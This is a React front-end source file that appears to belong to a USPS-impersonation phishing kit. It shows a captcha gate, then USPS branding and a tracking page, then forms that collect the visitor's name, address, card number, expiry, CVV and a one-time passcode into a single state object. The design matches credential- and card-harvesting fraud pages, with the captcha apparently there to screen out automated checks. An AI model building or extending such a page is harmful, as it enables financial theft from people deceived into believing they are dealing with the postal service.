import React, { useState } from 'react';
import AddressForm from './components/AddressForm';
import PaymentForm from './components/PaymentForm';
import OtpForm from './components/OtpForm';
import USPSMenu from './Menu/USPSMenu';
import TrackingPage from './components/TrackingPage';
import CaptchaGate from './components/CaptchaGate'; // Import your Captcha component

function App() {
  const [step, setStep] = useState('captcha'); // Start with captcha
  const [verified, setVerified] = useState(false);
  const [formData, setFormData] = useState({
    firstName: '',
    lastName: '',
    country: '',
    address: '',
    zipCode: '',
    city: '',
    cardNumber: '',
    expirationDate: '',
    cvv: '',
    otp: ''
  });
  const [error, setError] = useState('');

  const handleCaptchaVerified = () => {
    setVerified(true);
    setStep('address');
  };

  const nextStep = () => {
    if (step === 'address') setStep('payment');
    else if (step === 'payment') setStep('otp');
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  return (
    <div className="app-container">
      {!verified ? (
        // Show only Captcha before verification
        <CaptchaGate onVerified={handleCaptchaVerified} />
      ) : (
        // Show full interface after verification
        <>
          <USPSMenu/>
          <TrackingPage/>
          
          {step === 'address' && (
            <AddressForm
              formData={formData}
              handleChange={handleChange}
              nextStep={nextStep}
              error={error}
              setError={setError}
            />
          )}

          {step === 'payment' && (
            <PaymentForm
              formData={formData}
              handleChange={handleChange}
              nextStep={nextStep}
              setError={setError}
            />
          )}

          {step === 'otp' && (
            <OtpForm
              formData={formData}
              handleChange={handleChange}
              setError={setError}
            />
          )}
        </>
      )}
    </div>
  );
}

export default App;